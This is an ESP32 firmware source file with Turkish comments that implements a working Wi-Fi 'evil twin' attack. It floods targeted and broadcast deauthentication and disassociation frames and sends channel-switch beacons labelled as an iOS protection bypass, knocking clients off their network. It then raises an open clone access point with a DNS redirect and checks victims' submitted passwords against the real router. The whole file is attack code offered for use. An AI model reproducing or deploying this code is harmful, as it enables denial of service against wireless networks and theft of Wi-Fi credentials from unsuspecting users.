#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include "evil_twin.h"
#include "definitions.h"
#include "passwords.h"
#include "types.h"
#include "web_interface.h"

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
bool    evil_twin_active  = false;
String  evil_twin_ssid    = "";
int     evil_twin_clients = 0;
int     evil_twin_channel = 1;
uint8_t evil_twin_bssid[6] = {0};

// ─── İç değişkenler ───────────────────────────────────────────────────────────
static DNSServer dns_server;
static const uint8_t DNS_PORT = 53;
static deauth_frame_t et_frame;

static unsigned long et_last_retrack = 0;
static unsigned long et_last_csa     = 0;

// ─── Bağımlılıklar ────────────────────────────────────────────────────────────
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// ─── Evil Twin Snifer (deauth + disassoc + broadcast — iOS/Android bypass) ────
IRAM_ATTR static void et_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *pkt = (wifi_packet_t *)raw->payload;
  const mac_hdr_t *hdr = &pkt->hdr;

  if ((int16_t)(raw->rx_ctrl.sig_len - sizeof(mac_hdr_t)) < 0) return;
  if (memcmp(hdr->dest, et_frame.sender, 6) != 0) return;

  memcpy(et_frame.station, hdr->src, 6);

  // Hedefli DEAUTH — reason 7 (iOS için etkili)
  et_frame.reason = 7;
  for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, &et_frame, sizeof(et_frame), false);

  // Hedefli DISASSOC (0xA0) — PMF korumasız cihazlar için
  et_frame.frame_control[0] = 0xA0;
  et_frame.reason = 7;
  for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, &et_frame, sizeof(et_frame), false);

  // Reason 6 disassoc
  et_frame.reason = 6;
  for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, &et_frame, sizeof(et_frame), false);

  // Broadcast DEAUTH + DISASSOC
  memset(et_frame.station, 0xFF, 6);
  et_frame.frame_control[0] = 0xC0;
  et_frame.reason = 3;
  for (int i = 0; i < 4; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, &et_frame, sizeof(et_frame), false);
  et_frame.frame_control[0] = 0xA0;
  for (int i = 0; i < 4; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, &et_frame, sizeof(et_frame), false);

  // Geri yükle
  memcpy(et_frame.station, hdr->src, 6);
  et_frame.frame_control[0] = 0xC0;
  et_frame.reason = 1;

  BLINK_LED(1, 10);
}

// ─── CSA Beacon (iOS PMF bypass) ─────────────────────────────────────────────
static void et_send_csa_beacon() {
  const uint8_t *bssid   = evil_twin_bssid;
  const char    *ssid    = evil_twin_ssid.c_str();
  uint8_t        ssid_len = (uint8_t)evil_twin_ssid.length();
  uint8_t        channel  = (uint8_t)evil_twin_channel;

  uint8_t buf[128];
  uint8_t *p = buf;

  *p++ = 0x80; *p++ = 0x00;
  *p++ = 0x00; *p++ = 0x00;
  memset(p, 0xFF, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;

  memset(p, 0, 8); p += 8;
  *p++ = 0x64; *p++ = 0x00;
  *p++ = 0x11; *p++ = 0x04;

  *p++ = 0x00; *p++ = ssid_len;
  memcpy(p, ssid, ssid_len); p += ssid_len;

  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;

  *p++ = 0x03; *p++ = 0x01; *p++ = channel;

  // CSA IE — kanal 14'e geç (geçersiz kanal → bağlantı kesilir)
  *p++ = 0x25; *p++ = 0x03;
  *p++ = 0x01;  // Mode 1
  *p++ = 0x0E;  // Kanal 14
  *p++ = 0x01;  // Count 1

  int flen = (int)(p - buf);
  for (int i = 0; i < 8; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, buf, flen, false);
    delayMicroseconds(400);
  }
}

// ─── İç yardımcı: sniferi başlat ─────────────────────────────────────────────
static void et_start_sniffer() {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&et_sniffer);
}

// ─── Evil Twin başlat ─────────────────────────────────────────────────────────
void start_evil_twin(int wifi_number) {
  evil_twin_ssid    = WiFi.SSID(wifi_number);
  evil_twin_channel = WiFi.channel(wifi_number);
  memcpy(evil_twin_bssid, WiFi.BSSID(wifi_number), 6);
  evil_twin_clients = 0;
  evil_twin_active  = true;
  et_last_retrack   = millis();
  et_last_csa       = millis();

  DEBUG_PRINT("Evil Twin: ");
  DEBUG_PRINTLN(evil_twin_ssid);

  // Mevcut promiscuous'ı durdur
  esp_wifi_set_promiscuous(false);

  // Deauth çerçevesini ayarla
  et_frame.reason = 1;
  memcpy(et_frame.access_point, evil_twin_bssid, 6);
  memcpy(et_frame.sender,       evil_twin_bssid, 6);

  // APSTA modu — hem sahte AP hem STA (şifre testi için)
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);

  // DNS: tüm sorguları 192.168.4.1'e yönlendir
  dns_server.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  et_start_sniffer();
}

// ─── Şifre testi — AP KAPANMAZ ────────────────────────────────────────────────
// APSTA modunda STA arayüzü ayrı çalışır: AP ve DNS kesintisiz devam eder.
bool evil_twin_test_password(const String &password) {
  DEBUG_PRINT("Sifre deneniyor: ");
  DEBUG_PRINTLN(password);

  // Sniferi durdur (STA bağlantısı snifer ile çakışır)
  esp_wifi_set_promiscuous(false);
  // DNS + AP çalışmaya DEVAM EDİYOR — WiFi.mode() ÇAĞIRILMIYOR

  // Düşük seviyeli STA yapılandırma — AP arayüzünü etkilemez
  wifi_config_t sta_cfg = {};
  snprintf((char *)sta_cfg.sta.ssid,     sizeof(sta_cfg.sta.ssid),     "%s", evil_twin_ssid.c_str());
  snprintf((char *)sta_cfg.sta.password, sizeof(sta_cfg.sta.password), "%s", password.c_str());
  sta_cfg.sta.bssid_set = 1;
  memcpy(sta_cfg.sta.bssid, evil_twin_bssid, 6);
  sta_cfg.sta.channel = (uint8_t)evil_twin_channel;

  esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
  esp_wifi_connect();

  // Test süresi boyunca web sunucusu çalışmaya devam eder
  unsigned long t = millis();
  bool connected = false;
  while (millis() - t < ET_TEST_TIMEOUT_MS) {
    wl_status_t s = WiFi.status();
    if (s == WL_CONNECTED)      { connected = true; break; }
    if (s == WL_CONNECT_FAILED) break;
    delay(80);
    web_interface_handle_client();
    dns_server.processNextRequest();
  }
  esp_wifi_disconnect();

  if (!connected) {
    // AP hâlâ ayakta, sniferi yeniden başlat
    delay(200);
    et_start_sniffer();
  }
  return connected;
}

// ─── Hedef yeniden bulma (router resetlenirse) ────────────────────────────────
static void et_retrack() {
  DEBUG_PRINT("ET Hedef taraniyor: ");
  DEBUG_PRINTLN(evil_twin_ssid);

  esp_wifi_set_promiscuous(false);

  // Async olmayan kısa tarama
  int n = WiFi.scanNetworks(false, true, false, 120);
  for (int i = 0; i < n; i++) {
    if (WiFi.SSID(i) == evil_twin_ssid) {
      int new_ch = WiFi.channel(i);
      bool changed = (new_ch != evil_twin_channel) ||
                     (memcmp(WiFi.BSSID(i), evil_twin_bssid, 6) != 0);
      if (changed) {
        evil_twin_channel = new_ch;
        memcpy(evil_twin_bssid, WiFi.BSSID(i), 6);
        memcpy(et_frame.access_point, evil_twin_bssid, 6);
        memcpy(et_frame.sender,       evil_twin_bssid, 6);
        // Sahte AP kanalını güncelle (AP kapanmadan)
        WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
        DEBUG_PRINTF("ET yeni kanal: %d\n", evil_twin_channel);
      }
      break;
    }
  }
  WiFi.scanDelete();
  et_start_sniffer();
}

// ─── Evil Twin döngüsü (main loop'tan çağrılır) ───────────────────────────────
void evil_twin_loop() {
  if (!evil_twin_active) return;

  dns_server.processNextRequest();
  evil_twin_clients = WiFi.softAPgetStationNum();

  unsigned long now = millis();

  // CSA beacon: her CSA_INTERVAL_MS ms'de bir — iOS PMF bypass
  if (now - et_last_csa >= CSA_INTERVAL_MS) {
    et_last_csa = now;
    et_send_csa_beacon();
  }

  // Hedef yeniden bulma: RETRACK_INTERVAL_MS'de bir
  if (now - et_last_retrack >= RETRACK_INTERVAL_MS) {
    et_last_retrack = now;
    et_retrack();
  }
}

// ─── Evil Twin durdur ─────────────────────────────────────────────────────────
void stop_evil_twin() {
  DEBUG_PRINTLN("Evil Twin durduruluyor...");
  evil_twin_active  = false;
  evil_twin_ssid    = "";
  evil_twin_clients = 0;

  esp_wifi_set_promiscuous(false);
  dns_server.stop();

  WiFi.softAPdisconnect(true);
  delay(150);
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);
}
